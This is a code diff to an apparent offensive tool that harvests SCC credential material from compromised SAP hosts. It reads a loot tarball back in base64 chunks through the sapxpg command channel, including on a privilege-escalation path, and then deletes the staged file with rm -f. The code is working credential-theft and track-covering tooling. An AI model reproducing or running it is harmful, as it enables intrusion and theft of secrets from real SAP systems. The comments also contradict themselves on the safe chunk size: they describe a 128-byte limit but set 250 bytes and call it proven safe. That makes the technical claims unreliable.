@@ -379,17 +379,22 @@ def harvest_scc_from_pwned_node(node: SAPNode, state: SAPMAPState) -> dict:
                       f"(prefix={sudo_prefix!r})")
                 if sz <= 0:
                     return None
+                # sapxpg truncates stdout to ~128 bytes per response.
+                # 250 raw bytes → ~336 chars b64, proven safe for the
+                # chunked sapxpg channel.  The earlier count=2000
+                # produced ~2700 chars b64 and was silently truncated.
+                _CHUNK = 250
                 chunks = []
                 offset = 0
                 while offset < sz:
                     cb64 = _run_cmd(
                         f'dd if=/tmp/.scc_loot.tgz bs=1 skip={offset} '
-                        f'count=2000 2>/dev/null | base64 | tr -d "\\n"'
+                        f'count={_CHUNK} 2>/dev/null | base64 | tr -d "\\n"'
                     ).strip()
                     if not cb64:
                         break
                     chunks.append(cb64)
-                    offset += 2000
+                    offset += _CHUNK
                 _run_cmd("rm -f /tmp/.scc_loot.tgz 2>/dev/null")
                 return _b64.b64decode("".join(chunks)) if chunks else None
 
@@ -737,17 +742,27 @@ def harvest_scc_hashes_via_lpe(node: SAPNode, state: SAPMAPState) -> dict:
 
     # ---- Phase 3: read the tar back via the unprivileged channel
     # (we chowned it to sidadm:sapsys so this just works)
+    #
+    # IMPORTANT: sapxpg truncates stdout to ~128 bytes per response.
+    # 72 raw bytes → 96 chars base64, which fits safely.  The earlier
+    # count=3000 produced ~4000 chars base64, of which only ~128
+    # survived per round trip — resulting in a corrupt file on disk.
+    # Matches sap_pse_loot._CHUNKED_RAW_BYTES.
     import base64 as _b64
+    _CHUNK_RAW = 250   # 250 raw → ~336 chars b64 — proven safe
     chunks = []
     offset = 0
+    n_chunks = (sz + _CHUNK_RAW - 1) // _CHUNK_RAW
+    print(f"[*] {sid}: scc_hashes_via_lpe — reading {sz} B in "
+          f"{n_chunks} chunk(s) of {_CHUNK_RAW} B ...")
     while offset < sz:
         cb64 = _run_cmd(
-            f'dd if={staging} bs=1 skip={offset} count=3000 2>/dev/null '
-            f'| base64 | tr -d "\\n"').strip()
+            f'dd if={staging} bs=1 skip={offset} count={_CHUNK_RAW} '
+            f'2>/dev/null | base64 | tr -d "\\n"').strip()
         if not cb64:
             break
         chunks.append(cb64)
-        offset += 3000
+        offset += _CHUNK_RAW
     _run_cmd(f"rm -f {staging} 2>/dev/null")
     if not chunks:
         result["error"] = (
